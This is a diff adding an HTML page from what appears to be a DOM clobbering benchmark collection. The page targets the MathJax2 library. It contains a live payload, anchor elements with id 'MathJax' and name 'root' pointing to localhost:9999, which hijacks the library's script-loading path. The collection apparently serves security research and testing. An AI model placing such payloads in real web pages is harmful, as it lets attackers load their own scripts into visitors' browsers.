@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+</head>
+<body>
+<h1>DOM Clobbering Collection - mathjax2</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;a id=&quot;MathJax&quot;&gt;&lt;/a&gt;
+&lt;a id=&quot;MathJax&quot; name=&quot;root&quot; href=&quot;https://localhost:9999&quot;&gt;&lt;/a&gt;</pre>
+  <a id="MathJax"></a>
+<a id="MathJax" name="root" href="https://localhost:9999"></a>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script&gt;
+(function() {
+        var script = document.createElement(&quot;script&quot;);
+        script.type = &quot;text/javascript&quot;;
+        script.src = &quot;https://mathjax.rstudio.com/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;;
+        document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
+    }
+)();
+&lt;/script&gt;</pre>
+  <script>
+(function() {
+        var script = document.createElement("script");
+        script.type = "text/javascript";
+        script.src = "https://mathjax.rstudio.com/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML";
+        document.getElementsByTagName("head")[0].appendChild(script);
+    }
+)();
+</script>
+  </div>
+</section>
+
+</body>
+</html>
